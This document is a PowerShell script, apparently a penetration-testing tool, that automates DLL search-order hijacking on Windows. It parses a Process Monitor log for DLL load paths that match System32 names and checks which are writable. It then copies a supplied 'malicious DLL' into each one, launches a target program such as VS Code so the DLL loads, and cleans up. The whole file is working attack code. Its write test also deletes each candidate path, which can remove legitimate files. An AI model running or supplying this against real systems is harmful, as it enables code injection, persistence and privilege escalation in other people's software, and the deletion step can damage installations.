#Get-PotentialDLLHijack -CSVPath .\Logfile.CSV -MaliciousDLLPath .\DLLHijackTest.dll -ProcessPath "C:\Users\John\AppData\Local\Programs\Microsoft VS Code\Code.exe"

function Get-PotentialDLLHijack {
    param (
        [String]
        $CSVPath = "",
        [String]
        $MaliciousDLLPath = "",
        [String]
        $ProcessPath = "",
        [String]
        $ProcessArguments = ""
    )

    $PotentialHijackPath = @()
    Import-CSV $CSVPath | Foreach-Object {$PotentialHijackPath += $_.Path}
    $PotentialHijackPath = $PotentialHijackPath | Select-Object -Unique

    $WriteablePath = @()
    foreach($x in $PotentialHijackPath)
    {
        $FileName = Split-Path $x -Leaf
        $System32Path = "C:\Windows\System32\" + $FileName
        if (Test-Path $System32Path -PathType Leaf)
        {
            try
            {
                [io.file]::OpenWrite($x).close()
                $WriteablePath += $x  
            }
            catch { Write-Warning "Unable to write to output file $x" }
            Remove-Item $x
        }
    }
    Write-Host "[+] Parsed Procmon output for potential DLL hijack paths!" -ForegroundColor Green

    $ProcessName = [io.path]::GetFileNameWithoutExtension($ProcessPath)
    foreach($HijackPath in $WriteablePath)
    {
        try
        {
            Copy-Item $MaliciousDLLPath $HijackPath
            Write-Host "[+] Copied $MaliciousDLLPath to $HijackPath" -ForegroundColor Green
        }
        catch{ Write-Host "[-] Failed to copy $MaliciousDLLPath to $HijackPath" -ForegroundColor Red }
        
        if ($ProcessArguments -eq '')
        {
            try
            {
                Start-Process -FilePath $ProcessPath
                Write-Host "[+] Started $ProcessPath" -ForegroundColor Green
            }
            catch{ Write-Host "[-] Failed to start $ProcessPath" -ForegroundColor Red }
        }
        else
        {
            try
            {
                Start-Process -FilePath $ProcessPath -ArgumentList $ProcessArguments -WindowStyle Minimized
                Write-Host "[+] Started $ProcessPath $ProcessArguments" -ForegroundColor Green
            }
            catch{ Write-Host "[-] Failed to start $ProcessPath$ProcessArguments" -ForegroundColor Red }
        }

        Start-Sleep -s 7

        
        Get-Process $ProcessName -ErrorAction SilentlyContinue -ErrorVariable GetProcessError | Stop-Process -ErrorAction SilentlyContinue -ErrorVariable StopProcessError
        
        if ($GetProcessError)
        {
            Write-Host "[-] Failed to kill $ProcessName, it never started properly. Continuing..." -ForegroundColor Red
        }
        elseif($StopProcessError)
        {
            Write-Host "[-] Failed to kill $ProcessName" -ForegroundColor Red
        }
        else
        {
            Write-Host "[+] Killed $ProcessName process" -ForegroundColor Green
        }

        Start-Sleep -s 2

        
        Remove-Item $HijackPath -ErrorAction SilentlyContinue -ErrorVariable RemoveItemError
        if ($RemoveItemError)
        {
            Write-Host "[-] Failed to remove $HijackPath, trying again..." -ForegroundColor Red
            
            $count = 0
            while( $count -lt 2 )
            {
                Remove-Item $HijackPath -ErrorAction SilentlyContinue -ErrorVariable RemoveItemError
                if ($RemoveItemError)
                {
                    Write-Host "[-] Failed to remove $HijackPath" -ForegroundColor Red    
                }
                else
                {
                    Write-Host "[+] Removed $HijackPath" -ForegroundColor Green
                    break
                }
                Write-Host "[-] Trying again..." -ForegroundColor Red   
                Start-Sleep -s 5
                $count = $count + 1
            }
        }
        else
        {
            Write-Host "[+] Removed $HijackPath" -ForegroundColor Green
        }
    }

    Write-Host "[+] Script complete, check path specified in DLL for output!" -ForegroundColor Green

}